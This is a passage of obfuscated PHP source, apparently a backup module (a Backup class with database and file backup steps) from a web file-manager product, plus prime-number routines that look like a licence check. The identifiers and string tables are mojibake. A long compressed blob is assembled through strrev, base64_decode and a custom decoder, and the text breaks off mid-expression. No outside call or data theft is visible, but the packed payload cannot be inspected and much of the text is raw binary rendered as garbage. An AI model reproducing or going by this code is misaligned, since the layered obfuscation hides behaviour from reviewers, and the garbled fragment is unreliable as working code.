($E¢ñ¾„åôÖ = 0; $E¢ñ¾„åôÖ < $Dø°²±’¼‡ * 10; $E¢ñ¾„åôÖ++) { if (($Dø°²±’¼‡ * $E¢ñ¾„åôÖ + 1) % $fëŒçÀ¬„¡ == 0) { $C…õè†‹ó× = $E¼§¼×¦°¹[263](($Dø°²±’¼‡ * $E¢ñ¾„åôÖ + 1) / $fëŒçÀ¬„¡); break; } } $cß×æìùÄ = $E¼§¼×¦°¹[124]($E¼§¼×¦°¹[369] . ($b‰ºé®„·ˆ + $bùÔÃÈÉ¯í) . $E¼§¼×¦°¹[370] . $fëŒçÀ¬„¡ . $E¼§¼×¦°¹[370] . $C…õè†‹ó× . $E¼§¼×¦°¹[371]); goto CàªÚ’‚‘; a„çÑ³âš: } public function dwah7f5094e3() { goto ağšîË•¢Æ; b‚Í°ù·½: return $BÑŒ¬ùÑÁò; goto A¤ÊÍ“Œ‡Á; ağšîË•¢Æ: $DóÛ¹®ª¦¦ =& $_SERVER[œº]; $C™á‰ƒ»¾ =& $_SERVER[¡è¹ïÊœğŞ]; $F×ˆù‚­ğÌ = $C™á‰ƒ»¾[354]($C™á‰ƒ»¾[373](2, 14), $C™á‰ƒ»¾[373](2, 16) - 1); goto bÔ†Š¿ãâ; bÔ†Š¿ãâ: $a™èèÈŠâ = array(); $aöÂÅ‘ßšë = 1; $C°¢ÆÛÍˆè = $DóÛ¹®ª¦¦[704]; goto c‰®Ì …ÊÑ; c‰®Ì …ÊÑ: while ($aöÂÅ‘ßšë <= (int) $C™á‰ƒ»¾[374]($F×ˆù‚­ğÌ)) { $fäë«×¦ä¦ = $aöÂÅ‘ßšë; $Fø¶Ú†¤åÌ = $DóÛ¹®ª¦¦[676]; while (!0) { $fäë«×¦ä¦++; if ($fäë«×¦ä¦ <= 2) { $aöÂÅ‘ßšë = $fäë«×¦ä¦; break; } else { if ($fäë«×¦ä¦ < 2) { continue; } } $d‚ÚÈ˜Ç‚§ = !0; for ($E¤õÍîŠ—å = 2; $E¤õÍîŠ—å <= $C™á‰ƒ»¾[374]($fäë«×¦ä¦); $E¤õÍîŠ—å++) { if ($fäë«×¦ä¦ % $E¤õÍîŠ—å == 0) { $d‚ÚÈ˜Ç‚§ = !1; } } if ($d‚ÚÈ˜Ç‚§) { $aöÂÅ‘ßšë = $fäë«×¦ä¦; break; } } $a™èèÈŠâ[] = $aöÂÅ‘ßšë; $dà‚›¢ÏœÕ = $DóÛ¹®ª¦¦[705]; } $BÑŒ¬ùÑÁò = 2; for ($fäë«×¦ä¦ = $F×ˆù‚­ğÌ; $fäë«×¦ä¦ > 1; $fäë«×¦ä¦--) { $d‚ÚÈ˜Ç‚§ = !0; $b©ô¿åµ„ = $DóÛ¹®ª¦¦[706]; while ($b©ô¿åµ„ < $DóÛ¹®ª¦¦[578]) { if ($b©ô¿åµ„ >= 0) { break; } $b©ô¿åµ„++; } foreach ($a™èèÈŠâ as $a›ØªëÃ–Ä) { if ($fäë«×¦ä¦ % $a›ØªëÃ–Ä == 0) { $d‚ÚÈ˜Ç‚§ = !1; break; } } if ($d‚ÚÈ˜Ç‚§) { $BÑŒ¬ùÑÁò = $fäë«×¦ä¦; break; } } goto b‚Í°ù·½; A¤ÊÍ“Œ‡Á: } public function znqj55fbc7bc($EÏäè…ÏÓ, $FÔ‚ñ¼ÑŸ) { $DÇÌæœ¼™Ä =& $_SERVER[¡è¹ïÊœğŞ]; return $DÇÌæœ¼™Ä[13](array($DÇÌæœ¼™Ä[14], $DÇÌæœ¼™Ä[375]), $EÏäè…ÏÓ, $FÔ‚ñ¼ÑŸ); } public function euda86295df6($EÛ‰•„¿ë, $A’”ÓÁöòª) { $Dã†…Ö‡ô =& $_SERVER[¡è¹ïÊœğŞ]; return $Dã†…Ö‡ô[13](array($Dã†…Ö‡ô[376], $Dã†…Ö‡ô[377]), $EÛ‰•„¿ë, $A’”ÓÁöòª); } public function vaso99b174d6($F¯ŞÌˆÁÕù, $bõºãİØá) { $aÚ—ØĞƒ =& $_SERVER[œº]; $e·Ù¤µ”… =& $_SERVER[¡è¹ïÊœğŞ]; return $e·Ù¤µ”…[13](array($e·Ù¤µ”…[376], $e·Ù¤µ”…[378]), $F¯ŞÌˆÁÕù, $bõºãİØá); $D÷ğº·½Ä” = $aÚ—ØĞƒ[707]; while ($D÷ğº·½Ä” < $aÚ—ØĞƒ[589]) { if ($D÷ğº·½Ä” >= 0) { break; } $D÷ğº·½Ä”++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $D‡–‹“Àˆò =& $_SERVER[œº]; $this->isManual(); self::$name = date($D‡–‹“Àˆò[708]); if (!($d½÷ˆìöÛÕ = Model($D‡–‹“Àˆò[709])->lastItem())) { $d½÷ˆìöÛÕ = $this->initData(); } else { self::$name = $d½÷ˆìöÛÕ[$D‡–‹“Àˆò[28]]; if ($d½÷ˆìöÛÕ[$D‡–‹“Àˆò[710]] == $D‡–‹“Àˆò[87]) { self::$name = date($D‡–‹“Àˆò[711]); $eÒ—‘òÚ‰ = 0; if (isset($d½÷ˆìöÛÕ[$D‡–‹“Àˆò[291]][$D‡–‹“Àˆò[193]][$D‡–‹“Àˆò[447]])) { $eÒ—‘òÚ‰ = (int) $d½÷ˆìöÛÕ[$D‡–‹“Àˆò[291]][$D‡–‹“Àˆò[193]][$D‡–‹“Àˆò[447]]; } if (self::$manual == 0 && $d½÷ˆìöÛÕ[$D‡–‹“Àˆò[28]] == self::$name) { Model($D‡–‹“Àˆò[709])->remove($d½÷ˆìöÛÕ[$D‡–‹“Àˆò[393]]); } $d½÷ˆìöÛÕ = $this->initData($eÒ—‘òÚ‰, $d½÷ˆìöÛÕ[$D‡–‹“Àˆò[712]]); } else { $this->checkStore($d½÷ˆìöÛÕ[$D‡–‹“Àˆò[712]]); } } self::$option = $d½÷ˆìöÛÕ; } private function isManual() { $eÂ…ğø£ = _get($GLOBALS, $_SERVER[œº][713], 0); $eÂ…ğø£ = intval($eÂ…ğø£); self::$manual = $eÂ…ğø£ && $eÂ…ğø£ == 1 ? 1 : 0; } private function initData($ašç§¿”İ¯ = 0, $dÒŸÚ˜ï‘¬ = '') { goto fâ§êÊ¹Ğ; bÏ„³‹­Ğ³: $this->checkStore($d…»Àº‰¯Ö[$b”£’º¶Ù™[712]]); if (self::$manual == 1) { self::$name .= $b”£’º¶Ù™[71] . date($b”£’º¶Ù™[714]); } $eÚæïÆÒƒ® = array($b”£’º¶Ù™[712] => $d…»Àº‰¯Ö[$b”£’º¶Ù™[712]], $b”£’º¶Ù™[28] => self::$name, $b”£’º¶Ù™[710] => 0, $b”£’º¶Ù™[715] => $d…»Àº‰¯Ö[$b”£’º¶Ù™[715]], $b”£’º¶Ù™[716] => self::$manual, $b”£’º¶Ù™[291] => array($b”£’º¶Ù™[717] => array($b”£’º¶Ù™[710] => 0), $b”£’º¶Ù™[718] => array($b”£’º¶Ù™[710] => 0, $b”£’º¶Ù™[719] => 0, $b”£’º¶Ù™[720] => 0, $b”£’º¶Ù™[29] => $b”£’º¶Ù™[33], $b”£’º¶Ù™[721] => 0, $b”£’º¶Ù™[476] => 0), $b”£’º¶Ù™[722] => array($b”£’º¶Ù™[710] => 0, $b”£’º¶Ù™[719] => 0, $b”£’º¶Ù™[720] => 0, $b”£’º¶Ù™[721] => 0, $b”£’º¶Ù™[476] => 0), $b”£’º¶Ù™[193] => array($b”£’º¶Ù™[710] => 0, $b”£’º¶Ù™[723] => 0, $b”£’º¶Ù™[724] => 0, $b”£’º¶Ù™[725] => 0, $b”£’º¶Ù™[726] => 0, $b”£’º¶Ù™[447] => $ašç§¿”İ¯, $b”£’º¶Ù™[721] => 0, $b”£’º¶Ù™[476] => 0)), $b”£’º¶Ù™[721] => time(), $b”£’º¶Ù™[476] => 0); goto a„ˆ¡²÷¯İ; a„ˆ¡²÷¯İ: $a¯´…Ú·’Ì = Model($b”£’º¶Ù™[709])->insert($eÚæïÆÒƒ®); $eÚæïÆÒƒ®[$b”£’º¶Ù™[393]] = $a¯´…Ú·’Ì; return $eÚæïÆÒƒ®; goto DÓÙ¦³¬ƒ¸; fâ§êÊ¹Ğ: $b”£’º¶Ù™ =& $_SERVER[œº]; $d…»Àº‰¯Ö = Model($b”£’º¶Ù™[709])->config(); if ($dÒŸÚ˜ï‘¬ && $d…»Àº‰¯Ö[$b”£’º¶Ù™[712]] != $dÒŸÚ˜ï‘¬) { $ašç§¿”İ¯ = 0; } goto bÏ„³‹­Ğ³; DÓÙ¦³¬ƒ¸: } private function checkStore($fê²†ëÂ†) { $cöÊ÷Òã¦ =& $_SERVER[œº]; $BÁîí‘¥Ã = Model($cöÊ÷Òã¦[727])->listData($fê²†ëÂ†); Model($cöÊ÷Òã¦[727])->checkConfig($BÁîí‘¥Ã); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[œº][709])->findByName(self::$name); } return self::$option; } public static function set($dŒ¿ôÁ…•÷) { $f¿š©‰¨Ú‰ =& $_SERVER[œº]; $C‰´ó§å– = self::get(); foreach ($dŒ¿ôÁ…•÷ as $fÉò£ø«ôò => $d‰ ¹å’Ç³) { $A–åè£®ß¶ = explode($f¿š©‰¨Ú‰[95], $fÉò£ø«ôò); $Fİ†‚‡ØâØ = count($A–åè£®ß¶); switch ($Fİ†‚‡ØâØ) { case 1: $C‰´ó§å–[$A–åè£®ß¶[0]] = $d‰ ¹å’Ç³; break; case 2: $C‰´ó§å–[$A–åè£®ß¶[0]][$A–åè£®ß¶[1]] = $d‰ ¹å’Ç³; break; case 3: $C‰´ó§å–[$A–åè£®ß¶[0]][$A–åè£®ß¶[1]][$A–åè£®ß¶[2]] = $d‰ ¹å’Ç³; break; } } Model($f¿š©‰¨Ú‰[709])->update($C‰´ó§å–[$f¿š©‰¨Ú‰[393]], $C‰´ó§å–); self::$option = $C‰´ó§å–; return self::$option; } public function keep() { $E˜Ûö§âà† =& $_SERVER[œº]; $DŸ¨›ƒìÆÄ = self::get(); if ($DŸ¨›ƒìÆÄ[$E˜Ûö§âà†[291]][$E˜Ûö§âà†[717]][$E˜Ûö§âà†[710]] == $E˜Ûö§âà†[87]) { return; } $this->backupKeep($DŸ¨›ƒìÆÄ); self::set(array($E˜Ûö§âà†[728] => 1)); } private function backupKeep($Aùöë•…­¤) { goto F×¶›§Ååæ; F×¶›§Ååæ: $bºİ‡Ñœ¡Ô =& $_SERVER[œº]; if (self::$manual == 1) { return; } $bŒÆÃÔÃæ = Model($bºİ‡Ñœ¡Ô[709])->listData(); goto Fùƒ‚‘É­; e¤İ­Í‹„: foreach ($bŒÆÃÔÃæ as $Cˆ×Ç¬ù ª) { if ($Eº”àÛÖÏÈ >= 7) { break; } $b¦Ğ•†ø•Ğ[] = $Cˆ×Ç¬ù ª[$bºİ‡Ñœ¡Ô[28]]; $Eº”àÛÖÏÈ++; } for ($Eº”àÛÖÏÈ = 0; $Eº”àÛÖÏÈ < 12; $Eº”àÛÖÏÈ++) { $b¦Ğ•†ø•Ğ[] = date($bºİ‡Ñœ¡Ô[729], strtotime("\55{$Eº”àÛÖÏÈ}\x20\155\x6f\x6e\x74\150\163")); } $b¦Ğ•†ø•Ğ = array_unique($b¦Ğ•†ø•Ğ); goto CÀ¨»‘Åğ ; Fùƒ‚‘É­: if (empty($bŒÆÃÔÃæ)) { return; } $Eº”àÛÖÏÈ = 0; $b¦Ğ•†ø•Ğ = array(); goto e¤İ­Í‹„; CÀ¨»‘Åğ : $aÁÍ¼¢±½ = Model($bºİ‡Ñœ¡Ô[730])->get($bºİ‡Ñœ¡Ô[731]); foreach ($bŒÆÃÔÃæ as $Cˆ×Ç¬ù ª) { if (isset($Cˆ×Ç¬ù ª[$bºİ‡Ñœ¡Ô[716]]) && $Cˆ×Ç¬ù ª[$bºİ‡Ñœ¡Ô[716]] == $bºİ‡Ñœ¡Ô[87]) { continue; } if (!empty($Cˆ×Ç¬ù ª[$bºİ‡Ñœ¡Ô[28]]) && in_array($Cˆ×Ç¬ù ª[$bºİ‡Ñœ¡Ô[28]], $b¦Ğ•†ø•Ğ)) { continue; } Model($bºİ‡Ñœ¡Ô[709])->remove($Cˆ×Ç¬ù ª[$bºİ‡Ñœ¡Ô[393]]); $Eïò‡‡¬‰æ = $this->backupPath($Aùöë•…­¤, $aÁÍ¼¢±½); IO::remove($Eïò‡‡¬‰æ, !1); } goto cİíôÂ¼´ƒ; cİíôÂ¼´ƒ: } private function backupPath($FÄ÷èÙ‘œˆ, $C¡¤¸´ Êğ = false) { $d¾ê”Àƒ±Ç =& $_SERVER[œº]; if (!$C¡¤¸´ Êğ) { $C¡¤¸´ Êğ = Model($d¾ê”Àƒ±Ç[730])->get($d¾ê”Àƒ±Ç[731]); } $Eá‚÷ÀÛ›À = $FÄ÷èÙ‘œˆ[$d¾ê”Àƒ±Ç[28]]; $d¯‘Á¥ÄÈ = substr(md5($d¾ê”Àƒ±Ç[732] . $C¡¤¸´ Êğ . $Eá‚÷ÀÛ›À), 0, 8); return "\173\x69\157\72{$FÄ÷èÙ‘œˆ[$d¾ê”Àƒ±Ç[712]]}\175\x2f\144\141\x74\x61\142\x61\163\x65\57\142\x61\x63\x6b\x75\x70\x2f" . $Eá‚÷ÀÛ›À . $d¾ê”Àƒ±Ç[71] . $d¯‘Á¥ÄÈ; } public function db() { goto EÃœ£Åó»°; Cªö™Ğ­…: $bŒØßŠˆõŠ = new BackupDb(); if (!$bŒØßŠˆõŠ->index()) { return !1; } self::set(array($a×¶Ø…†ºô[733] => 1)); goto BÜÍ¢Ïá¡å; EÃœ£Åó»°: $a×¶Ø…†ºô =& $_SERVER[œº]; $eóñİÖ˜ßÃ = self::get(); if ($eóñİÖ˜ßÃ[$a×¶Ø…†ºô[291]][$a×¶Ø…†ºô[718]][$a×¶Ø…†ºô[710]] == $a×¶Ø…†ºô[87]) { return !0; } goto Cªö™Ğ­…; BÜÍ¢Ïá¡å: return !0; goto Fî¶À·ŠÌô; Fî¶À·ŠÌô: } public function dbFile() { goto bÀ¶Œ·‡ø—; bÀ¶Œ·‡ø—: $FÄ¢Ÿó§Ô‰ =& $_SERVER[œº]; $dìñƒÉãÎÁ = self::get(); if ($dìñƒÉãÎÁ[$FÄ¢Ÿó§Ô‰[291]][$FÄ¢Ÿó§Ô‰[722]][$FÄ¢Ÿó§Ô‰[710]] == $FÄ¢Ÿó§Ô‰[87]) { return !0; } goto b¶¬²çĞŸ; AìŸ¥ßœÓÆ: return !0; goto c”òàç­Üë; b¶¬²çĞŸ: $aĞÏù¹ŸÅŞ = new BackupDbFile(); if (!$aĞÏù¹ŸÅŞ->index()) { return !1; } self::set(array($FÄ¢Ÿó§Ô‰[734] => 1)); goto AìŸ¥ßœÓÆ; c”òàç­Üë: } public function file() { $fÔ‰Ğ¢ˆø =& $_SERVER[œº]; $Aä¢…©–ÜÖ = self::get(); if ($Aä¢…©–ÜÖ[$fÔ‰Ğ¢ˆø[291]][$fÔ‰Ğ¢ˆø[193]][$fÔ‰Ğ¢ˆø[710]] == $fÔ‰Ğ¢ˆø[87]) { return !0; } if (!isset($Aä¢…©–ÜÖ[$fÔ‰Ğ¢ˆø[715]]) || $Aä¢…©–ÜÖ[$fÔ‰Ğ¢ˆø[715]] == $fÔ‰Ğ¢ˆø[191]) { $DÃí•ì¡É“ = new BackupFile(); if (!$DÃí•ì¡É“->index()) { return !1; } } self::set(array($fÔ‰Ğ¢ˆø[735] => 1, $fÔ‰Ğ¢ˆø[710] => 1)); return !0; } } goto bÊ™¥÷ò¦à; b„ğ‹Ê¬Ÿ¯: $Có–¬¨¥‰‰ = $_SERVER[œº][574]; $_SERVER[¡è¹ïÊœğŞ] = explode($_SERVER[œº][575], gzinflate(substr($_SERVER[œº][576], 10, -8))); $EÃÖ¯¿åÑ¯ = $_SERVER[œº][577]; goto B’ë³Áæ¤Å; câ×ŠïÏ¼¶: if (!function_exists('_kodDe')) { function _kodDe($Aµë¡ˆ†Ì) { $Aµë¡ˆ†Ì = base64_decode($Aµë¡ˆ†Ì); $bçĞÀ¶õ = strlen($Aµë¡ˆ†Ì); $AĞˆÉ†¥» = ''; $b¥ˆË²Ñ§ = ord($Aµë¡ˆ†Ì[0]) - 30; for ($d—›ÛÀ£æ• = 1; $d—›ÛÀ£æ• < $bçĞÀ¶õ; $d—›ÛÀ£æ• += 2) { if ($d—›ÛÀ£æ• + 1 < $bçĞÀ¶õ) { $AĞˆÉ†¥» .= chr(ord($Aµë¡ˆ†Ì[$d—›ÛÀ£æ• + 1]) + $b¥ˆË²Ñ§); $AĞˆÉ†¥» .= chr(ord($Aµë¡ˆ†Ì[$d—›ÛÀ£æ•]) + $b¥ˆË²Ñ§); } else { $AĞˆÉ†¥» .= chr(ord($Aµë¡ˆ†Ì[$d—›ÛÀ£æ•]) + $b¥ˆË²Ñ§); } } return $AĞˆÉ†¥»; } } define(strrev('ºœ'), "\255\323\324\274\301\217"); $_SERVER[œº] = explode("\x7c\x4\x7c\x4\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\366\260\216\70\10\156\343\202\273\303\243\2\155\41\113\133\366\102\301\264\111\333\110\332\224\44\245\124\12\341".strrev('İöà.2¾à¿·'."\r".'ÇQ”gACqÔECqÅPeÄE‘\\tghİ/y¥ä›^iy%').base64_decode('/d73kjr/7/d9CuTdc/dz7z33nHPPPXfDjgfeWX/h489/PzAM/H/wtxvw78BvwA==').strrev('q½ìòÎ›ò=ç>vû÷/$ŞM¾C»¥ÄxØœ§êJJKòÈwı;ËÑïâßß').base64_decode('Z9/egw8ac+LEhypBYpy3Ev9Iac2QlF5VN3QMiGrpuNqOv9U0/nXiH70rqRoK/g==')."\xe\x37\xfa\x43\xe1\x60\x73\x53\x93\x27\x10\xa\x93\x12\xc5\xf8\x94\x16\x23\x5f\x19\x39\x2b\xa7\x48\xe1\x19\x25\xab\x83\xaa\xc4\xe2\xc2\x19\x2d\xa3\xa4\x4d\x10\xe\x88\xc9\x86\x1c\x91".strrev('B”mçSÚ«µ–OE,)MHF³ĞgĞ‡¶Jr»„ˆ¤‡“kPá­üù4öì:»’Ru')."\1\127\143\320\125\23\362\372\33\61\270\306\337\320\340\15\345\303\3\176\237\257\332\125\63\67\77\246\51\340\252\153\160\111\240\175\111\45\254\246\343\132\211\264\4\307"."\x2c\x91\x4a\xf1\x47\xad\xaa\x24\x63\xf8\x33\x2d\xd3\xe6\x18\x7d\x19\xf2\x15\x62\x5f\x60\xc\xd2\xb9\x64\x12\x7\x1a\xd9\x17\x69\xbf\x12\x97\x73\x49\x82\x33\xb7\x18\xc8\x64\xd5\x94\x4c"."\273\76\127\351\143\120\374\41\347\14\115\115\107\161\300\323\153\144\145\16\7\55\216\146\225\224\222\46\105\5\75\76\117\115\110\202\315\224\152\3\376\6\211\14\105\112"."\xd6\xd\x25\x2b\xb5\xd4\x7b\x2\x1e\x9\x36\xbd\xaa\x18\xf5\xb8\x58\xc2\xf9\x9a\x1b\x1\x42\x24\x97\xcf\x27\xd\x55\x82\xa1\xa4\x32\xb4\x18\x9c\xa7\x40\x61\xfe\x80\xdb\x13\x90\xaa\x5b".base64_decode('JY6nqJZKaWkHKAWMpyE01RMI4A8bmcE+Lxw6EvDX1gY9LEQ6N88HWjKJzFJTKA==')."\26\117\32\341\156\71\231\243\223\265\23\377\26\223\37\362\253\351\144\2\167\251\151\65\107\46\53\51\102\323\330\312\41\37\71\232\132\241\20\45\106\76\122\40\277\106".base64_decode('FhdYad34s2o2/p1JEkXCME7JGmElHdViapqsxzlk7ZEZKBsJd1YF6UiBmiOqZQ==').base64_decode('+hq0btKZuJpUfGy5xbVkTMnycAZkF2NIr9R+IXdjLiUmYcFoQk3GsnSV/lpKQA==')."\x7\xd4\x78\x1f\x5f\x8d\xba\x96\xcb\x46\x15\x2f\x58\x2f\x3c\x6f\x13\x6b\x49\x39\x49\xa4\x18\x6\xe8\xb4\x4e\xfb\xd5\x9c\x49\x6a\x72\x2c\xa8\x64\x85\xbe\xd6\x82\x8c\xfe\x9c\x21\x2\x73"."\50\131\255\226\115\271\1\335\40\365\203\325\242\66\27\210\350\244\353\45\46\240\320\201\177\234\45\13\317\265\377\274\150\341\231\340\237\122\102\374\332\110\323\22\112\62"."\31\126\172\25\262\256\122\261\51\72\355\253\123\217\250\151\47\200\340\240\327\37\116\310\172\242\41\66\45\214\162\221\226\247\143\112\257\43\223\310\340\40\137\367\155\246".base64_decode('eQ9Hp1EzPAJlTmpROSn2FH8nDCMTVNIxiBDSI60njRCWURSSyG2TYlKD1CrVVw==')."\xaa\x95\x3a\xcd\x98\x4a\xb2\x2f\xda\x3b\x6\xd3\x19\xd0\xe8\x25\x33\xa6\x88\x84\x95\x5e\x83\x20\x45\x9a\x19\x4d\xc8\x59\x30\x5c\x55\x39\x23\x6e\x9f\x8e\x81\x72\x26\x93\x54\xa3\xb2\xa1"."\x6a\x69\xa7\x16\x35\x14\xc3\xae\x1b\x59\x45\x26\xa5\xb9\xa2\x51\x45\xd7\xed\x35\x5a\xda\xc8\x6a\x49\xbb\x2b\x99\xd4\x7a\xec\xfe\xac\xda\xae\xa6\x2b\xa5\x9\x38\xd\x8c\x4\xeb\xdd\xe"."\51\144\45\131\304\105\63\45\70\127\40\201\230\200\153\243\213\223\245\316\312\151\75\256\144\355\36\262\150\52\45\60\36\214\100\322\144\156\125\317\150\272\12\233\127\51"._kodDe('MnK1Mw18/9ykl84RaoapljoRVZkbI5NSj4kBQaJXln30LC521RWpoxfQkxU2d38=')."\0\314\220\325\133\0\206\123\23\324\124\112\121\30\264\111\251\234\156\330\263\12\240\122\52\330\17\311\30\173\343\366\6\270\264\124\45\146\17\2\142\116\300\223\312\46"."\113\140\332\110\64\16\103\353\103\241\246\260\267\26\354\331\215\236\160\203\53\124\123\117\232\155\310\355\264\315\76\100\242\131\221\24\270\300\16\226\30\234\130\215\240\257".base64_decode('HNik9ShZUHF1X6XUqcUiWq+DRsHEQUBDaGI43BnDHpDT7RA/kT5DIdNP7243Iw==')."\332\247\244\333\215\4\315\30\364\4\346\173\2\341\240\277\66\324\342\12\220\335\76\15\146\111\57\255\12\26\235\264\7\224\30\100\175\324\240\371\344\14\304\32\115\3"."\x17\x6\x1c\x2b\x1a\xb\x17\xb\x8d\xf3\x79\xeb\x20\x62\xdc\x76\x1d\x24\xb2\x8b\xa9\x68\xd9\x3e\x35\xa5\xc2\xb6\x1b\x2c\x6\x61\x12\xb0\x2\x75\xa4\x41\x4e\xd4\xa1\xaa\xb6\xc4\x84\x92".strrev('psü“(¥çN‘)9TMàR©²Š¥Ê;–qç•N9¢Âc·6ÂéBwø;RÄØ¶').strrev('T-Û’›ÕdÇ#",ÿ´{I¥á§Ëä\\x5&ïŞ¨OáCökÌğuµ–ë')."\32\206\32\264\254\142\206\14\260\135\243\105\215\121\62\16\203\365\212\332\236\40\375\123\141\151\121\55\251\145\345\44\244\142\164\22\53\224\262\264\253\161\62\76\230\140".base64_decode('8kBQTWUoXTMSuVRE+KRsKRhvur0kNLa9aVnyVekkCcdV1JLF43cGJ4E/nAzHtA==').base64_decode('lEy5XUSSlBimSRg0wRRTr8h8vzSyhgahWVOSBsVIaGSQ2hXapBxrG21lTEkqFA==')."\x1b\x9\x85\x92\xf4\x32\x92\xc\xec\x4c\xc\x57\x71\x46\xde\x1\xe3\x6\xa0\x7c\x4b\x55\xf5\x0\xc8\x9\x19\x29\x1a\x6e\x81\xfc\x2e\x7\x18\x2c\x69\x12\xec\x26\xfe\x48\x7\x58\x2e\x38".base64_decode('HFb1WmHzD2soDjRe5umbskpcJYsuDUasQc520gxghPi2AwNCYbXNPl+4xt8YAg==')."\74\64\206\264\4\274\41\17\235\243\56\167\330\125\323\64\100\67\121\76\342\44\1\44\30\346\111\316\371\345\356\212\1\276\23\361\55\213\23\163\202\10\104\254\361\67".strrev('\'+Œ—µÇı•‡yºk;&€)íú§.×½ÎpróÓBÓ1N:ÉÆ-)(ö+­-Î ').base64_decode('3xCxQDCiW3uTP0gyzIFQwD1FlCxpR1MziUoJc6rOQ4AjyTRMyIR3crUEKenNgQ==').base64_decode('9Fm1X+Z9nEPbQ8ruTSU5Q2julZ2PRaje2zg33OB3e3xhbyOgS6F8eHOT20UHVw==')."\x84\x57\xfb\x43\xf5\x26\x68\x33\xa0\x4c\xf3\x5d\x3e\xaf\x35\xb9\x67\x81\x37\x18\xa\x16\x8c\x2\xb0\x66\x8f\x25\x6\xc8\x82\x4d\x1\x4f\xad\x77\x1\xb\xd6\x7a\x3d\x3e\x77\x30\x5c\xe3".base64_decode('qqnnaRpdDSQQjkNpTHea04cBiQ0ymS7cDeVTiqywSYAKU9EgzOcB2C4VMvdIdw==').strrev('`0Ğn¢}¤Gè”†FJ'."\n".'ä©OğK'."\n".'İ2VY2RUJ)‰±‘³£–¨ôxBzŒT¡')."\111\375\22\41\367\171\55\10\303\64\325\112\234\121\356\302\0\127\334\140\124\300\22\6\353\202\307\201\21\160\41\361\33\314\4\64\42\141\272\326\164\40\257\270\150\163"."\xe2\x5c\xf4\xd\xfb\x9b\x3c\x1\x17\x14\x9c\xc3\x2d\x1\x7f\x63\x1d\xc9\xd0\x93\x50\x68\x3\xbc\x4\xfd\x25\x94\x7d\x22\xf2\xb3\xc1\x49\x18\xe0\x7d\x64\x2a\x42\x71\xa4\x77\x68\x14\x95"."\x3\xf8\x67\x3c\xfe\x1\x6c\x1f\xa9\x5c\x49\x53\xac\x47\x20\x35\x67\x84\x81\x7c\xc4\xc1\x6a\xa0\x94\x58\xcb\xb1\xda\x22\x9a\x46\x6a\x48\x42\xe\x60\x80\xd2\x3\x26\x79\x77\xe8\x74\x92"."\364\122\342\63\221\124\330\113\166\224\220\177\256\247\61\114\147\26\16\11\263\21\3\200\54\353\17\20\204\30\132\47\25\250\160\144\300\23\244\253\74\253\164\345\124\212".base64_decode('LqdjIpnFCti0SPXOxW09E0sW2ic6FoGP0gln4iAJtTlMwbEkfy7LckPGqESfUw==').base64_decode('WtnmbHOWzKlc6LL3y/b+MvsM+6KJbY7SiQSwaGmFbfIgTAASzjljEfipapszrg==').strrev('É¤’ÄÃ'."\0".'“@KcSXûF, YsDõ¡Î”&‹=mÇ6˜âr¸¨¶Ø\\ÎKş>Í')."\23\22\320\210\176\65\303\241\113\247\16\122\70\30\103\245\235\347\130\150\157\233\270\150\216\220\117\0\131\353\2\314\22\240\277\11\226\316\145\77\33\366\214\145\205\353"."\236\314\217\134\72\312\251\47\134\27\21\71\112\350\200\332\236\146\113\10\160\1\114\110\67\363\351\113\307\341\337\101\72\220\355\12\131\364\110\321\226\45\263\63\227\126"."\273\250\16\42\255\164\221\17\315\240\363\73\242\30\75\12\235\36\0\156\12\203\311\101\5\103\20\45\204\222\210\55\44\65\160\1\115\101\322\12\351\105\46\14\171\262".base64_decode('HhaKKWkyTiNIaj0qZ5Sg0MNwOOSq9nnClMIQSkzDiCpWM60d6BqnqJQ+RDmTjg==')."\xe4\x11\xb2\xf2\xf5\xae\xa4\x84\x8\x83\xa4\x64\xb3\x5a\xb6\x12\x69\x27\xf5\x5c\x6\x32\x73\x40\xf6\x32\x0\x6e\x25\x20\xb8\x4b\x55\xb3\x25\x8c\x72\x92\x2f\x2c\xe\x40\x46\xa6\x9c\x3"."\x94\xa5\x19\x37\xe0\x2c\x69\x6b\xcb\x2d\x54\x62\x8b\x16\x82\x49\x2d\xdb\xe3\x8b\x96\x4e\x1a\x2c\xa5\x3c\xba\xb3\xd\xfc\x47\x3\x98\x96\x91\xd6\x67\xf8\x58\xea\x80\x59\xa3\x9c\x93\xab"."\x80\x12\x2d\xcc\xa8\x61\x18\xec\xcf\xe\xd8\xe\xa6\x7\x31\x5\x58\x34\xe\x6a\x59\xc6\x34\x65\x4c\x6c\xb7\xa1\x19\x72\xd2\x54\x44\x8\x42\xc8\xe0\xb2\x8d\x9b\xa8\xc\xf0\x68\xfb\x38"."\305\202\133\271\240\203\104\344\264\221\51\330\230\2\104\120\177\301\34\101\305\160\260\24\66\41\22\377\133\105\264\0\161\65\15\326\120\215\260\277\141\245\115\260\117\67"."\x94\x94\x49\x4f\xa9\x2b\x72\x36\x9a\xa8\xcd\x25\x93\x6\xe3\xf8\x93\x6a\x27\x29\x96\x2c\x90\x25\x85\xd2\xd6\x6a\x59\x2a\xd9\x4e\x20\xf5\x16\x4d\x28\x94\xd0\x9b\x4e\x3\x39\x54\x9c\x50"."\174\53\255\163\1\246\45\44\225\120\235\236\344\155\224\252\375\176\237\307\325\50\301\135\233\354\66\136\267\235\346\137\140\367\272\361\67\373\120\143\164\20\0\45\63\50"."\x94\x68\xb3\x48\x8\x32\x8f\x36\xa8\xb8\xb1\x41\x16\xc1\x6\x9a\x65\x83\x92\x90\x8d\x33\xec\x36\xae\xe\xb3\x31\x76\xd9\x46\xb8\x68\x9b\x21\x67\xc1\x6\xf\xd9\x5c\xf2\xe9\x75\xdb\x54"."\335\215\104\4\124\56\212\242\355\60\22\120\63\221\224\373\154\270\115\76\245\133\111\332\150\213\154\264\241\66\312\342\333\220\310\346\46\255\151\6\123\234\264\6\175\2"."\x9a\x97\xb0\xc1\xe1\x87\xb3\xcf\xc6\xb5\x74\xa4\x3a\x41\xa6\xb0\x71\x79\xc3\xd6\x9e\xd5\x72\x99\x26\x5a\x93\x10\xc2\x8d\x21\x0\xde\x52\x6\x8\x68\x9a\x61\xa3\x32\xa4\x2d\x5f\xbc\x2c"."\x8c\xb2\xc2\x4d\x47\x38\xb6\xd6\x4d\xc6\x7\x46\xe5\xa3\xa4\x70\xe9\xf9\x38\x37\x4b\x47\x4b\x71\x41\x44\xca\x1e\xa4\xfb\x90\x29\xd\x1f\x42\